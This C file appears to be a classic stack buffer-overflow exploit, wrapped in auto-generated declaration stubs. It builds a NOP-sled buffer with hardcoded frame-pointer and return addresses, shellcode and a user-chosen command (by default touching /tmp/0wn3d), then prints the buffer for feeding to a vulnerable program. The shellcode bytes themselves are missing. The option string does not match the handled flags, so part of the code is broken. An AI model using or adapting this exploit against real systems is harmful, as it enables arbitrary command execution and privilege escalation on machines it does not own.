#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int BUF_SIZE ; 
 char EOF ; 
 char* TALKING ; 
 int /*<<< orphan*/  bcopy (char*,char*,size_t) ; 
 int /*<<< orphan*/  bzero (char*,int) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 char getopt (int,char**,char*) ; 
 int /*<<< orphan*/  memset (char*,int,int) ; 
 char* optarg ; 
 int /*<<< orphan*/  printf (char*,char*) ; 
 char* shellcode ; 
 int /*<<< orphan*/  stderr ; 
 size_t strlen (char*) ; 
 unsigned long strtoul (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 

void main(int argc, char **argv) {
char buf[BUF_SIZE+1];
char *foo;
char *command, c;
unsigned long retaddr,bp, offset, shelloffset;

/* defaults */
command="/bin/touch /tmp/0wn3d";
retaddr=0xbfffe598;
bp=0xbfffe678;
offset = 16;
shelloffset = 24;


while((c = getopt(argc, argv, "s:c:")) !=EOF) 
        switch(c) {
                case 's':
                        retaddr = strtoul(optarg,NULL,0); 
                        break;
                case 'a':
                        shelloffset = strtoul(optarg,NULL,0); 
                        break;
                case 'o':
                        offset = strtoul(optarg,NULL,0); 
                        break;
                case 'c':
                        command = optarg;
                        if (strlen(command) > 42) 
                                fprintf(stderr,"WARNING: your command line "
                                "might get truncated!\n");
                        break;
                default:
                        fprintf(stderr, "usage %s [-c command] [-s retaddr]"
                        " [-o offset] [-a shelloffset]\n", argv[0]);
                        exit(1);

        }


 foo=&buf[offset];
 bzero(buf,BUF_SIZE+1);
 memset(buf,0x90,BUF_SIZE);

 *foo++ = (bp >> 0) & 0xff;
 *foo++ = (bp >> 8) & 0xff;
 *foo++ = (bp >>16) & 0xff;
 *foo++ = (bp >>24) & 0xff;

 *foo++ = (retaddr >> 0) & 0xff;
 *foo++ = (retaddr >> 8) & 0xff;
 *foo++ = (retaddr >>16) & 0xff;
 *foo++ = (retaddr >>24) & 0xff;
 /*
  * you can get outside the buffer boundaries here but I don't care. Very long
  * command lines would be damaged by shellcode or truncated anyway.. 
  */
 bcopy(shellcode,&buf[shelloffset],strlen(shellcode+1));
 bcopy(command,&buf[24+strlen(shellcode)],strlen(command)+1);
 printf(TALKING, buf);

}